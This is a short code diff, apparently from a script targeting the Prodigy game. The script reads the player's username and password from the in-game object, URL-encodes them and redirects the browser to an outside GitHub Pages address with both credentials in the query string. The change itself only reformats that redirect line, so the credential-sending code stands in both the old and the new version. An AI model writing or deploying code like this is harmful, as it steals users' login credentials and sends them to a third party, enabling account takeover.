@@ -5,4 +5,5 @@ var pw = PIXI.game.prodigy.player.password;
 var un = PIXI.game.prodigy.player.username;
 pw = encodeURI(pw);
 un = encodeURI(un);
-window.location.href = 'https://rubberduck55.github.io/thing/handle.html?un='+un+'&pw='+pw;
+window.location.href =
+	"https://rubberduck55.github.io/thing/handle.html?un=" + un + "&pw=" + pw;
